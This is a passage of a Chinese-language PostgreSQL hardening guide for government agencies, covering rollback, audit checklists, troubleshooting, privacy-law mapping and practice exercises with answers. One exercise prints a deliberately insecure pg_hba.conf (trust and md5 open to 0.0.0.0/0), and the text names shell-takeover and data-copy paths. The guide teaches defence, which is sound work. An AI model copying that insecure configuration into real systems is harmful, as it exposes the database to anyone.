pg_hba 無 md5                                  待改善 期望=0 實際=3
pg_hba 無解析錯誤                              通過  (0)
TCP 規則全為 hostssl                           待改善 期望=0 實際=4
...
===============================================================
統計：通過 8 ／ 高風險未通過 9 ／ 中風險未通過 4
===============================================================
exit=1
```

★★★★ 這份 `pg-hardening-before.txt` 就是稽核回覆表「整改前」那一欄的來源，**請歸檔**。

### 步驟 2～7：整改順序（★★★★★ 順序不能換）

```text
② 先開 SSL、但 pg_hba 不動          → 零影響，隨時可回頭
   ↓
③ 改 password_encryption + 重設密碼 → 逐個帳號，出錯只影響一個帳號
   ↓
④ 應用端逐一改連線字串 verify-full  → 由測試環境先行，一次一台
   ↓
⑤ pg_stat_ssl 歸零，觀察一個完整營運日（含批次、月結）★★★★
   ↓
⑥ 才動 pg_hba：host → hostssl、md5 → scram、加 reject 兜底
   ↓
⑦ 最後才收 listen_addresses 與防火牆（需要 restart，安排維護時段）
```

> [!danger] ★★★★★ 為什麼 pg_hba 要放在第六步而不是第一步
> `pg_hba.conf` 是**唯一一個「改完立刻對所有新連線生效」而且「沒有半套」的東西**。
> 你把 `host` 改成 `hostssl` 的那一秒，所有還沒改連線字串的應用**同時**失敗。
> 前五步都是「可以先做、不影響現況」的準備，把風險壓縮到第六步的那一次 reload。

每一步做完都跑一次檢查腳本，看數字往下掉：

```bash
sudo /usr/local/bin/pg-hardening-check.sh 17 main | tail -n 4
```

### ★★★★★ 回滾：pg_hba 改壞了，全部應用瞬間連不上

這是最需要事先演練的情境。**回滾必須在 60 秒內完成**：

```bash
# 【前置】★★★★★ 動 pg_hba 之前，一定先做這件事
sudo cp -a /etc/postgresql/17/main/pg_hba.conf \
           /etc/postgresql/17/main/pg_hba.conf.$(date +%Y%m%d-%H%M%S)
ls -l /etc/postgresql/17/main/pg_hba.conf*
```

預期輸出：

```text
-rw-r----- 1 postgres postgres 5312 Aug 28 09:40 pg_hba.conf
-rw-r----- 1 postgres postgres 5312 Aug 28 09:40 pg_hba.conf.20260828-094012
```

```bash
# 【回滾】救回上一版並 reload（★★★★ reload 不會中斷既有連線）
sudo cp -a /etc/postgresql/17/main/pg_hba.conf.20260828-094012 \
           /etc/postgresql/17/main/pg_hba.conf
sudo systemctl reload postgresql@17-main
sudo -u postgres psql -Atc "SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL;"
```

預期輸出：

```text
0
```

> [!danger] ★★★★★ 如果連 `sudo -u postgres psql` 都進不去
> 代表 `local all postgres peer` 那行也被你改壞了。這時**只剩單機模式**：
> ```bash
> sudo systemctl stop postgresql@17-main
> sudo -u postgres /usr/lib/postgresql/17/bin/postgres --single -D /var/lib/postgresql/17/main postgres
> ```
> 單機模式**完全繞過 pg_hba.conf**，可以在 `backend>` 提示字元下執行 SQL 改回設定。
> ★★★★★ 這也正是「能碰到資料目錄的 OS 帳號 = 資料庫全權」的證明 ——
> 資料庫的權限模型擋不住有 root 的人，這件事要寫進風險評估。

憑證換錯的回滾同理，但更輕鬆：★★★ `ssl_cert_file` 是 sighup 參數，
換回舊憑證再 reload 即可，**既有連線不會斷**。

### 驗收檢查表

| # | 檢查項 | 指令 | 預期結果 |
| --- | --- | --- | --- |
| 1 | ★★★★★ 外部掃不到 5432 | `nmap -Pn -p 5432 db01…`（從辦公網段） | `filtered` |
| 2 | ★★★★ 只綁指定介面 | `sudo ss -lntp \| grep 5432` | 只有 `127.0.0.1` 與內網 IP，無 `[::]` |
| 3 | ★★★★ pg_hba 無高風險方法 | `psql -Atc "SELECT count(*) FROM pg_hba_file_rules WHERE auth_method IN ('trust','password','md5','ident')"` | `0` |
| 4 | ★★★★ pg_hba 無解析錯誤 | `psql -Atc "SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL"` | `0` |
| 5 | ★★★★ 全部 scram | `psql -Atc "SELECT count(*) FROM pg_authid WHERE rolpassword LIKE 'md5%'"` | `0` |
| 6 | ★★★★ 無額外 superuser | `psql -Atc "SELECT count(*) FROM pg_roles WHERE rolsuper AND rolname<>'postgres'"` | `0` |
| 7 | ★★★★★ 無明文連線 | `psql -Atc "SELECT count(*) FROM pg_stat_ssl WHERE ssl=false"`（扣掉 local） | `0` |
| 8 | ★★★★ 憑證是自建 CA 簽的 | `openssl s_client -connect db01:5432 -starttls postgres \| openssl x509 -noout -issuer` | issuer 為機關 CA |
| 9 | ★★★ SAN 含應用用的位址 | 同上加 `-ext subjectAltName` | DNS 與 IP 都在 |
| 10 | ★★★★ 私鑰權限 | `stat -c '%a' …/server.key` | `600` |
| 11 | ★★★★ PUBLIC 無 CONNECT | `psql -Atc "SELECT datacl FROM pg_database WHERE datname='appdb'"` | 無 `=Tc/` 開頭項 |
| 12 | ★★★★ 稽核軌跡有產生 | `grep -c 'AUDIT:' /var/log/postgresql/postgresql-17-main.log` | `> 0` |
| 13 | ★★★★ 日誌有送出去 | 在 SIEM 搜尋 `connection authorized` | 近 1 小時有資料 |
| 14 | ★★★★★ 明文連線被拒 | `psql "host=db01 … sslmode=disable"` | `FATAL: no pg_hba.conf entry … no encryption` |
| 15 | ★★★★ 回滾檔存在 | `ls /etc/postgresql/17/main/pg_hba.conf.*` | 至少一份 |
| 16 | ★★★★ 健檢全綠 | `sudo pg-hardening-check.sh; echo $?` | `統計：… 高風險未通過 0`、`0` |

### 產出稽核回覆

```bash
sudo /usr/local/bin/pg-hardening-check.sh 17 main | sudo tee /var/log/pg-hardening-after.txt
diff -y --suppress-common-lines /var/log/pg-hardening-before.txt /var/log/pg-hardening-after.txt
```

★★★ 把 before / after 兩份輸出附進稽核回覆，比任何文字說明都有力。
★★★★ 再把這支腳本排進每月巡檢（systemd timer 或 cron），
**組態飄移**（有人臨時改了設定沒改回來）才抓得到：

```bash
sudo tee /etc/cron.d/pg-hardening-check > /dev/null <<'EOF'
# 每月 1 日 03:20 執行，非 0 離開碼會由 cron 寄信給 root
20 3 1 * * root /usr/local/bin/pg-hardening-check.sh 17 main > /var/log/pg-hardening-$(date +\%Y\%m).txt 2>&1
EOF
```

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| ★★★★★ 把 `host` 改成 `hostssl` 並 reload 後，**全部應用同時**連不上、前台白畫面 | 還有客戶端沒改連線字串，仍用 `sslmode=disable`/`prefer` 且沒帶 CA | 先 `cp` 回備份的 `pg_hba.conf` 再 reload 止血 → 回到「階段 0」用 `pg_stat_ssl` 確認 `ssl=false` 歸零再切 |
| ★★★★★ 資安通報說你的資料庫被列在網路空間搜尋引擎上 | `listen_addresses='*'` + `ufw allow 5432/tcp` | 立即 `ufw delete` 該規則（不用重啟）→ 收 `listen_addresses` → ★★★★ **假設已外洩**，查日誌的外部 `connection authorized` 來源，啟動應變流程 |
| ★★★★★ 改完 `pg_hba.conf` 之後連 `sudo -u postgres psql` 都進不去 | 連 `local all postgres peer` 那行也被改掉了 | 用 `postgres --single -D <datadir> postgres` 單機模式繞過 pg_hba 進去改回來 |
| ★★★★ 服務起不來，日誌只寫 `private key file "…server.key" has group or world access` | 私鑰權限不是 0600（常見於 `cp` 之後忘了 `chmod`） | `sudo chown postgres:postgres server.key && sudo chmod 600 server.key`；★★★ 或改成 root 擁有 + 0640 |
| ★★★★ `psql: server certificate for "db01.example.gov.tw" does not match host name "10.10.20.11"` | 憑證 SAN 只寫了 DNS，應用連線字串用 IP | `openssl x509 -ext subjectAltName` 確認 → 重簽含 `IP:` 的憑證 → reload（★★★ 不必重啟） |
| ★★★★ 改了 `pg_hba.conf` 並 reload，行為卻完全沒變 | reload 時語法有錯，PostgreSQL **保留舊規則**繼續跑 | `SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL` 必須為 0；日誌搜尋 `no changes were applied` |
| ★★★★ 在 `conf.d/50-hardening.conf` 改了參數，`SHOW` 出來還是舊值 | 有人用過 `ALTER SYSTEM`，`postgresql.auto.conf` 優先權最高 | `SELECT name,setting,sourcefile FROM pg_settings WHERE name='…'` 看 `sourcefile`；用 `ALTER SYSTEM RESET <參數>` 清掉 |
| ★★★★ 深夜所有應用同時 `password authentication failed for user "app_rw"`，密碼卻沒人改過 | 應用帳號被設了 `VALID UNTIL` 且剛好到期 | `SELECT rolvaliduntil FROM pg_authid WHERE rolname='app_rw'` → `ALTER ROLE app_rw VALID UNTIL 'infinity'` |
| ★★★★ 啟用 pgaudit 後磁碟被寫滿，資料庫停止寫入 | `pgaudit.log='all'` + `log_catalog=on`，psql 的 `\d` 就能灌出數百行 | 改用 object audit logging（`pgaudit.role`）只稽核敏感表；`log_catalog=off`；補上磁碟告警與 logrotate（見 [[100-01-02-guide-日誌-日誌集中與輪替]]） |
| ★★★★ 設了 `password_encryption='scram-sha-256'`，`pg_authid` 裡卻還是 md5 | 這個參數**只影響之後設定的密碼**，既有密碼不會自動轉 | 逐一 `\password <role>`，再查 `rolpassword LIKE 'SCRAM-SHA-256%'` 確認 |
| ★★★ `openssl s_client -connect db01:5432` 直接失敗，以為沒開 TLS | PostgreSQL 是先用自有協定協商再升級成 TLS | 加 `-starttls postgres` |
| ★★★ 裝了 pgaudit、也 `CREATE EXTENSION` 了，日誌卻沒有 `AUDIT:` | `shared_preload_libraries` 是 postmaster 參數，只 reload 沒用 | `sudo systemctl restart postgresql@17-main`，再 `SHOW shared_preload_libraries` 確認 |
| ★★★ RHEL 上憑證路徑權限明明對，卻回 `Permission denied` | SELinux 擋住非標準路徑 | `sudo ausearch -m avc -ts recent`；把憑證放 `/etc/pki/tls/` 或補 `semanage fcontext`，★★★ **不要**直接 `setenforce 0` |
| ★★★ 啟用 RLS 之後，應用還是看得到全部的列 | 應用帳號是**表的擁有者**，預設繞過 RLS | `ALTER TABLE … FORCE ROW LEVEL SECURITY`；並把表的擁有權改給 `schema_owner` |
| ★★ 健檢腳本回報「找不到 server.key」 | `ssl_key_file` 用相對路徑（相對於資料目錄） | 腳本已處理；手動檢查時記得補上 `data_directory` 前綴 |

### 排查步驟

**【1】先分清楚是「服務死了」還是「連不上」**

```bash
sudo systemctl is-active postgresql@17-main && sudo -u postgres psql -Atc "SELECT 1"
```

預期輸出：`active` 與 `1`。
★★★★ 兩個都正常 → 問題在**網路、pg_hba 或 TLS**，往【2】。
`is-active` 是 `failed` → 服務起不來，直接跳【7】看日誌。
`is-active` 是 `active` 但 psql 逾時 → 連線槽滿了，用
`sudo -u postgres psql -Atc "SELECT count(*) FROM pg_stat_activity"` 對照 `max_connections`。

**【2】從資料庫主機本機用 TCP 連（排除網路與防火牆）**

```bash
PGCONNECT_TIMEOUT=5 psql "host=127.0.0.1 port=5432 dbname=appdb user=app_rw sslmode=require" -c "SELECT 1"
```

本機 TCP 通、遠端不通 → 問題在**防火牆或 listen_addresses**，往【3】。
本機 TCP 也不通、但 `sudo -u postgres psql`（unix socket）通 → 問題在 **pg_hba 或 TLS**，往【4】。

**【3】確認監聽與防火牆**

```bash
sudo ss -lntp | grep 5432
sudo ufw status verbose | grep 5432
```

`ss` 只看到 `127.0.0.1:5432` 而應用在別台 → `listen_addresses` 收太緊，
加上內網位址並 ★★★★ **restart**（不是 reload）。
`ss` 有內網位址但 ufw 沒有對應 `ALLOW` → 補白名單規則。

**【4】看錯誤訊息判斷是 pg_hba、密碼還是 TLS**

★★★★ PostgreSQL 的錯誤訊息非常明確，先讀懂它再動手：

| 錯誤訊息 | 問題在 | 下一步 |
| --- | --- | --- |
| `no pg_hba.conf entry for host "x", user "y", database "z", no encryption` | ★★★★ pg_hba **沒有任何一行**命中，且你是明文連的 | 【5】 |
| `no pg_hba.conf entry for host "x", …, SSL encryption` | pg_hba 沒命中（已加密） | 【5】 |
| `password authentication failed for user "y"` | 密碼錯，或帳號 `VALID UNTIL` 到期 | 查 `pg_authid.rolvaliduntil` |
| `role "y" does not exist` | 帳號名打錯或已被 drop | `\du` |
| `database "z" does not exist` | ★★★★ 認證**已通過**，只是庫名錯 | 查 `\l` |
| `connection requires a valid client certificate` | `clientcert=verify-ca/full` 生效，客戶端沒帶憑證 | 【6】 |
| `SSL error: certificate verify failed` | 客戶端的 `sslrootcert` 不是簽這張伺服器憑證的 CA | 【6】 |
| `server certificate for "a" does not match host name "b"` | SAN 沒涵蓋應用實際連的位址 | 【6】 |

**【5】確認 pg_hba 到底有哪些規則、順序如何**

```bash
sudo -u postgres psql -c "
SELECT rule_number, type, database, user_name, address, auth_method, error
FROM pg_hba_file_rules ORDER BY rule_number;"
```

★★★★ 用「第一筆命中即定案」的規則，**由上往下手動比對一次**你那條連線的
(type, address, database, user)。
最常見的兩個原因：
- 你新增的規則放在一條寬鬆的 `reject` 之後 → 永遠輪不到
- 你寫了 `hostssl` 但客戶端用 `sslmode=disable` → type 對不上，等於沒有規則命中

**【6】驗證伺服器憑證與客戶端 CA 是同一條鏈**

```bash
openssl s_client -connect db01.example.gov.tw:5432 -starttls postgres </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -ext subjectAltName
openssl x509 -noout -fingerprint -sha256 -in /etc/ssl/certs/example-ca.crt
```

issuer 顯示 `ssl-cert-snakeoil` → 憑證根本沒換成功，
檢查 `ssl_cert_file` 路徑、檔案權限，以及是否 reload 過。
issuer 正確但客戶端仍失敗 → ★★★★ 比對 CA 指紋：伺服器鏈上的根憑證指紋
必須與客戶端 `sslrootcert` 的指紋**完全相同**。憑證鏈的檢視工具見
[[090-01-11-guide-PKI-憑證格式轉換與檢視工具]] 與 [[090-01-13-guide-PKI-憑證常見問題排查]]。

**【7】讀日誌（★★★★ 這一步不能跳）**

```bash
sudo tail -n 60 /var/log/postgresql/postgresql-17-main.log
sudo journalctl -u postgresql@17-main -n 60 --no-pager
```

| 訊息片段 | 代表 |
| --- | --- |
| `could not load private key file … Permission denied` | ★★★★ 私鑰權限或 SELinux/AppArmor |
| `private key file … has group or world access` | ★★★★ `chmod 600` |
| `configuration file … contains errors; no changes were applied` | ★★★★ reload 失敗，**舊規則還在跑** |
| `could not bind IPv4 address … Address already in use` | 埠被占用，或上一個實例沒停乾淨 |
| `connection authorized: … SSL enabled (protocol=TLSv1.3…)` | ★ 正常，順便是稽核證據 |
| 大量同來源 `password authentication failed` | ★★★★ 有人在猜密碼 → 【8】 |

**【8】找出還在裸連 / 正在被猜密碼的是誰**

```bash
# 還在明文的連線
sudo -u postgres psql -c "
SELECT a.client_addr, a.usename, a.application_name FROM pg_stat_ssl s
JOIN pg_stat_activity a USING(pid) WHERE s.ssl=false AND a.client_addr IS NOT NULL;"

# 最近一小時的認證失敗來源 Top 10
sudo grep 'authentication failed' /var/log/postgresql/postgresql-17-main.log \
  | awk '{for(i=1;i<=NF;i++) if($i ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) print $i}' \
  | sort | uniq -c | sort -rn | head -10
```

預期輸出：

```text
    247 203.0.113.44        # ★★★★★ 外部位址 = 你的資料庫對外開放了，立刻處理
      3 10.10.20.21         # ★ 應用改密碼時的殘留，可接受
```

**【9】確認整改沒有回頭**

```bash
sudo /usr/local/bin/pg-hardening-check.sh 17 main; echo "exit=$?"
```

預期輸出結尾：`統計：通過 21 ／ 高風險未通過 0 ／ 中風險未通過 0` 與 `exit=0`。

---

## 安全性注意事項

> [!danger] 絕對不要做的事
> - ★★★★★ **`pg_hba.conf` 裡出現 `trust` 搭配非 local 的 type。**
>   任何連得到 5432 的人，都能直接登入成 `postgres` 超級使用者，
>   然後 `COPY … FROM PROGRAM` 拿下整台主機。這不是「風險」，這是「已經淪陷」。
> - ★★★★★ **`sudo ufw allow 5432/tcp`。** 沒有 `from` 子句就是對全世界開放，
>   幾小時內就會被網路空間搜尋引擎索引。要開就寫 `from <單一 IP>`。
> - ★★★★★ **應用帳號給 superuser 或 `pg_execute_server_program`。**
>   一個 SQL 注入漏洞 = 主機 shell。這條沒有例外。
> - ★★★★★ **把正式庫的 `pg_dump` 檔放到共用磁碟、寄 email、丟到雲端硬碟。**
>   那是一整份可攜帶的個資資料庫，外洩即通報。
> - ★★★★ **開 `log_statement='all'` 或 `pgaudit.log_parameter=on` 之後忘記關。**
>   查詢參數（身分證字號、地址、健保資料）會原封不動寫進純文字日誌，
>   而且日誌的權限與保存期限通常沒有比照個資管理 —— 等於自己開了第二個外洩點。
> - ★★★★ **用 `sslmode=require` 就在稽核表上勾「已加密傳輸」。**
>   `require` 不驗伺服器身分，中間人架假 PostgreSQL 一樣連得上、一樣顯示已加密。
> - ★★★★ **在正式環境 `setenforce 0` 或 `aa-complain` 來「解決」憑證讀不到的問題。**
>   那是把整層 MAC 防護關掉去換一個路徑問題，正確做法是補 fcontext / AppArmor 規則。
> - ★★★★ **`ALTER SYSTEM` 與 `conf.d/` 混用。** 半年後沒有人講得清楚哪個值在生效。

### ★★★★ 個資法情境（機關必答題）

《個人資料保護法》第 27 條要求公務機關「採行適當之安全維護措施」，
施行細則第 12 條列出的項目裡，有四項直接對應本篇：

| 施行細則的要求 | 本篇對應的具體作為 | 稽核要看的證據 |
| --- | --- | --- |
| 資料安全管理 | ★★★★ `hostssl` + `verify-full` 強制加密傳輸 | `pg_stat_ssl` 全為 `t` 的截圖、日誌的 `SSL enabled` 行 |
| 存取控制 | ★★★★ pg_hba 白名單、`REVOKE … FROM PUBLIC`、欄位級權限、RLS | `pg_hba_file_rules` 輸出、`\dp citizens` |
| 事故預防與通報 | ★★★★ `log_connections` + 認證失敗告警 + 集中日誌 | SIEM 的告警規則與觸發紀錄 |
| ★★★★★ **使用紀錄、軌跡資料及證據保存** | **pgaudit** 的 `AUDIT: OBJECT,…,READ,SELECT,TABLE,public.citizens` | 日誌樣本 + 保存期限政策 + 日誌不可竄改的措施 |

★★★★★ 最後一項是最多機關答不出來的。
「誰在什麼時候查了誰的個資」如果查不出來，事故發生時就無法界定影響範圍，
也無法回答通報表上的「外洩筆數」。**pgaudit 要在系統上線前就裝好，不能事後補。**

法規面的完整說明見 [[090-07-07-guide-資安實踐-台灣資安法規與個資法]]。

#### ★★★★★ 交測試環境／廠商的正確流程

「把正式庫 dump 一份給廠商除錯」是機關最常見的個資外洩途徑。正確順序：

```text
【1】確認法律性質
     交給委外廠商 = 委託處理（要有書面契約、要有監督義務）
     交給其他機關 = 特定目的外利用（要有法定事由）
     ★★★★★ 兩者都不是「反正是內部使用」
        ↓
【2】能不給就不給：先確認能不能用「假資料重現問題」或「只給 schema」
     pg_dump --schema-only  ← ★★★★ 這通常就夠除錯了
        ↓
【3】非給不可 → 去識別化，而且在【匯出時】就做，不要「先 dump 再處理」
     建一個去識別化的 view / 用 UPDATE 覆寫敏感欄位後再 dump
     ★★★★ 姓名、身分證字號、地址、電話、生日、病歷 —— 全部替換，不是遮罩幾碼
        ↓
【4】驗證：在交付前實際查一次，確認查不到真實資料
     psql -c "SELECT id_number FROM citizens LIMIT 5"  ← 必須是假值
        ↓
【5】加密後交付，記錄「誰、何時、交付什麼、保存到何時、如何銷毀」
     age -r <廠商公鑰> dump.sql > dump.sql.age
        ↓
【6】期限到 → 要求書面銷毀證明，並在自己這端 shred 掉暫存檔
```

> [!danger] ★★★★★ 「只遮罩後四碼」不叫去識別化
> `A1234*****` 這種做法，配上同一份資料裡的生日、性別、戶籍地，
> 通常可以反推回特定個人。去識別化的判準是「無從識別特定當事人」，
> 不是「看起來少了幾個字」。★★★★ 正確做法是**整欄替換成無關聯的假值**，
> 而且同一個人在不同表要對應到同一個假值（否則資料關聯會壞掉，測不出問題）。

### TWGCB 對應：誠實的說法

> [!warning] ★★★★ 不要在稽核回覆表上填一個你查不到的基準編號
> TWGCB（政府組態基準）目前公布的 Linux 基準是**作業系統層級**的
> （Ubuntu、RHEL 等），本手冊已知的有 TWGCB-01-014、TWGCB-01-008、TWGCB-01-012。
> ★★★★★ **不要自己編一個「PostgreSQL 的 TWGCB 編號」填上去** —— 那是在稽核文件上造假。
>
> 正確的回覆方式：
> 1. 主機層面依 **TWGCB Linux 基準**（填實際適用的編號與版本）完成組態，
>    導入方式見 [[090-06-01-guide-TWGCB-TWGCB概念與法規要求]]
> 2. 資料庫層面**目前無對應之 TWGCB 基準**，故參採 CIS PostgreSQL Benchmark
>    與原廠安全指引，自訂 N 項檢核，以 `pg-hardening-check.sh` 每月自動驗證
> 3. 附上本篇的驗收檢查表與健檢輸出作為佐證
>
> ★★★ 動筆前先到 <https://www.nccst.nat.gov.tw/GCB> 確認當下有沒有新增資料庫類基準。

---

## 速查表

### 網路與准入（★★★★ 三層都要對）

| 項目 | 安全值 | 檢查指令 | 星級 |
| --- | --- | --- | --- |
| `listen_addresses` | `localhost,<內網IP>` | `psql -Atc "SHOW listen_addresses"` | ★★★★ |
| 防火牆 | 只有具名來源，無 `Anywhere` | `sudo ufw status numbered \| grep 5432` | ★★★★★ |
| pg_hba TCP type | 全為 `hostssl`（另有 `hostnossl … reject`） | `psql -Atc "SELECT count(*) FROM pg_hba_file_rules WHERE type='host'"` | ★★★★ |
| pg_hba 認證方法 | 只有 `scram-sha-256` / `cert` / `peer` / `reject` | `SELECT DISTINCT auth_method FROM pg_hba_file_rules` | ★★★★★ |
| pg_hba 解析錯誤 | `0` | `SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL` | ★★★★ |
| 外部掃描結果 | `filtered` | `nmap -Pn -p 5432 <host>` | ★★★★★ |

### 認證與授權

| 項目 | 安全值 | 檢查指令 | 星級 |
| --- | --- | --- | --- |
| `password_encryption` | `scram-sha-256` | `SHOW password_encryption` | ★★★★ |
| md5 雜湊帳號數 | `0` | `SELECT count(*) FROM pg_authid WHERE rolpassword LIKE 'md5%'` | ★★★★ |
| 無密碼可登入帳號 | `0` | `WHERE rolcanlogin AND rolpassword IS NULL` | ★★★★★ |
| 額外 superuser | `0` | `WHERE rolsuper AND rolname<>'postgres'` | ★★★★★ |
| PUBLIC 的 CONNECT | 已 REVOKE | `SELECT datacl FROM pg_database WHERE datname='appdb'` | ★★★★ |
| public schema 的 CREATE | 已 REVOKE | `SELECT nspacl FROM pg_namespace WHERE nspname='public'` | ★★★★ |
| untrusted 程序語言 | `0` | `SELECT count(*) FROM pg_language WHERE NOT lanpltrusted AND lanname NOT IN ('c','internal')` | ★★★★★ |

### 傳輸與稽核

| 項目 | 安全值 | 檢查指令 | 星級 |
| --- | --- | --- | --- |
| `ssl` | `on` | `SHOW ssl` | ★★★★ |
| `ssl_min_protocol_version` | `TLSv1.2` 以上 | `SHOW ssl_min_protocol_version` | ★★★ |
| 私鑰權限 | `600`（或 root:群組 `640`） | `stat -c '%a' server.key` | ★★★★★ |
| 明文連線數 | `0` | `SELECT count(*) FROM pg_stat_ssl WHERE ssl=false` | ★★★★★ |
| 客戶端 `sslmode` | `verify-full` | 應用連線字串 / `PGSSLMODE` | ★★★★ |
| `log_connections` | `on` | `SHOW log_connections` | ★★★★ |
| `log_line_prefix` | 含 `%u %d %h` | `SHOW log_line_prefix` | ★★★★ |
| pgaudit 載入 | 有 | `SHOW shared_preload_libraries` | ★★★★ |
| `pgaudit.log_parameter` | `off` | `SHOW pgaudit.log_parameter` | ★★★★★ |

### 檔案路徑與服務名

| 用途 | Ubuntu / Debian（主線） | RHEL 系 | 星級 |
| --- | --- | --- | --- |
| 主設定檔 | `/etc/postgresql/17/main/postgresql.conf` | `/var/lib/pgsql/17/data/postgresql.conf` | ★★★★ |
| pg_hba | `/etc/postgresql/17/main/pg_hba.conf` | `/var/lib/pgsql/17/data/pg_hba.conf` | ★★★★ |
| 資料目錄 | `/var/lib/postgresql/17/main` | `/var/lib/pgsql/17/data` | ★★★ |
| 日誌 | `/var/log/postgresql/postgresql-17-main.log` | `/var/lib/pgsql/17/data/log/*.log` | ★★★ |
| 服務名 | `postgresql@17-main` | `postgresql-17` | ★★★★ |
| reload | `systemctl reload postgresql@17-main` | `systemctl reload postgresql-17` | ★★★ |
| 叢集列表 | `pg_lsclusters` | （無，用 `systemctl list-units 'postgresql*'`） | ★★ |

### 「改完要 reload 還是 restart」判斷準則

| 參數類別（`pg_settings.context`） | 動作 | 例子 | 星級 |
| --- | --- | --- | --- |
| `postmaster` | ★★★★ **restart** | `listen_addresses`、`port`、`shared_preload_libraries`、`max_connections` | ★★★★ |
| `sighup` | ★ **reload** | `ssl`、`ssl_cert_file`、`log_*`、`authentication_timeout`、pg_hba | ★ |
| `superuser` / `user` | ★ 下次連線或 `SET` 即生效 | `password_encryption`、`log_min_duration_statement` | ★ |

```bash
# ★★★ 忘記的時候直接問伺服器
sudo -u postgres psql -Atc "SELECT name, context FROM pg_settings WHERE name = '<參數名>';"
```

---

## 練習題

> [!question]- 練習 1：找出這份 pg_hba.conf 的三個致命錯誤
> 下面是某機關資料庫的實際設定，請指出三處會導致嚴重後果的問題，並說明修正方式與修正**順序**。
>
> ```text
> local   all         all                       trust
> host    all         all      0.0.0.0/0        md5
> hostssl appdb       app_rw   10.10.20.0/24    scram-sha-256
> host    replication all      0.0.0.0/0        trust
> ```
>
> ---
> **參考解答**
>
> **錯誤一（★★★★★）**：第 1 行 `local all all trust`。
> 任何能登入這台主機的 OS 帳號（包含被入侵的 www-data、被 SQL 注入拿到的低權帳號）
> 都能 `psql -U postgres` 直接變成超級使用者。
> 修正：`local all postgres peer` + `local appdb app_rw scram-sha-256`。
>
> **錯誤二（★★★★★）**：第 2 行 `host all all 0.0.0.0/0 md5`。
> 三個問題疊在一起：全網開放、明文可連（`host` 同時接受非 SSL）、弱雜湊。
> 而且它在第 3 行**之前**，依「第一筆命中即定案」，第 3 行那條嚴格規則
> 對 `10.10.20.0/24` 來源**永遠不會被用到**。
> 修正：刪掉這行，讓第 3 行生效。
>
> **錯誤三（★★★★★）**：第 4 行 `host replication all 0.0.0.0/0 trust`。
> 複寫連線可以拉走**整顆資料庫**。全網 + 免密碼 = 任何人都能 `pg_basebackup`
> 把你的整份個資複製走，而且不會留下任何「異常查詢」的痕跡。
> 修正：`hostssl replication rep_user 10.10.20.12/32 cert clientcert=verify-full`。
>
> **修正順序（★★★★ 這是重點）**：
> 1. 先備份 `pg_hba.conf`
> 2. **先刪第 4 行**（風險最大且沒有正常用途在依賴它，可立即刪）
> 3. 再修第 1 行（改完立刻本機測 `sudo -u postgres psql`）
> 4. 第 2 行**最後**改 —— 要先確認所有應用都已改用 SSL 且都在 `10.10.20.0/24`，
>    否則會造成中斷。中間可先降級為 `hostssl all all 0.0.0.0/0 scram-sha-256` 過渡。
> 5. 每一步 `systemctl reload` 後查 `pg_hba_file_rules` 的 `error` 欄

> [!question]- 練習 2：把一台 md5 的舊庫遷移到 scram，全程不中斷
> 你接手一台 PostgreSQL 12 升級到 17 的資料庫，`pg_authid` 裡 8 個帳號全是 md5，
> 其中 3 個是應用帳號（不能中斷），5 個是人用帳號。
> 寫出完整的操作順序與每一步的驗證指令。
>
> ---
> **參考解答**
>
> ```bash
> # 【1】盤點 + 存基線
> sudo -u postgres psql -Atc "SELECT rolname, left(rolpassword,4) FROM pg_authid
>   WHERE rolcanlogin ORDER BY 1;" | sudo tee /var/log/pg-authhash-before.txt
> ```
>
> ```bash
> # 【2】改預設雜湊（★★★ 不影響既有密碼，可安全執行）
> sudo -u postgres psql -c "ALTER SYSTEM SET password_encryption='scram-sha-256';"
> sudo systemctl reload postgresql@17-main
> sudo -u postgres psql -Atc "SHOW password_encryption;"   # → scram-sha-256
> ```
>
> ```bash
> # 【3】確認 pg_hba 用的是 md5 方法（過渡期相容：md5 規則能驗 SCRAM 密碼）
> sudo -u postgres psql -Atc "SELECT DISTINCT auth_method FROM pg_hba_file_rules;"
> ```
>
> **【4】先換 5 個人用帳號**（出錯只影響一個人，風險最低）：
> ```bash
> sudo -u postgres psql -c "\password ops_alice"
> psql "host=db01 dbname=appdb user=ops_alice sslmode=verify-full" -c "SELECT 1"   # 立刻驗證
> ```
>
> **【5】再換 3 個應用帳號**（★★★★ 一次一個，且要協調應用端）：
> - 應用的密碼通常寫在 `.env` 或設定管理系統裡
> - 順序：改資料庫密碼 → 改應用設定 → 重載應用 → 看應用日誌無錯誤 → 才做下一個
> - ★★★★ 更安全的做法：先 `CREATE ROLE app_rw2` 用 scram，應用切過去確認正常，
>   再 `DROP ROLE app_rw` —— 這樣隨時可以切回去
>
> ```bash
> # 【6】確認全部轉完
> sudo -u postgres psql -Atc "SELECT count(*) FROM pg_authid WHERE rolpassword LIKE 'md5%';"   # → 0
> ```
>
> ```bash
> # 【7】最後才把 pg_hba 的 md5 改成 scram-sha-256
> sudo sed -i 's/\bmd5\b/scram-sha-256/g' /etc/postgresql/17/main/pg_hba.conf
> sudo systemctl reload postgresql@17-main
> sudo -u postgres psql -Atc "SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL;"   # → 0
> ```
>
> ★★★★ 關鍵：**步驟 7 一定在步驟 6 之後**。反過來的話，還沒換密碼的帳號會立刻被鎖死。

> [!question]- 練習 3：稽核委員問「上個月誰查過身分證字號欄位」
> 委員要求提供 2026 年 7 月所有存取 `citizens` 表的紀錄。
> 你的資料庫已裝 pgaudit。請寫出：(a) 怎麼撈出這份紀錄；
> (b) 如果當初沒裝 pgaudit，你該怎麼誠實回覆；(c) 之後怎麼避免再發生。
>
> ---
> **參考解答**
>
> **(a) 撈出紀錄**
> ```bash
> sudo zgrep -h 'AUDIT: OBJECT' /var/log/postgresql/postgresql-17-main.log.* \
>   | grep 'public.citizens' \
>   | awk -F' ' '$1 >= "2026-07-01" && $1 <= "2026-07-31"' \
>   | sed 's/,"SELECT.*//' > /tmp/citizens-access-202607.txt
> wc -l /tmp/citizens-access-202607.txt
> ```
> 每行含：時間、pid、`帳號@資料庫/應用名`、來源 IP、動作（READ/WRITE）、物件。
> ★★★★ 交付前要確認這份檔案本身**不含查詢參數**（`pgaudit.log_parameter=off` 的價值），
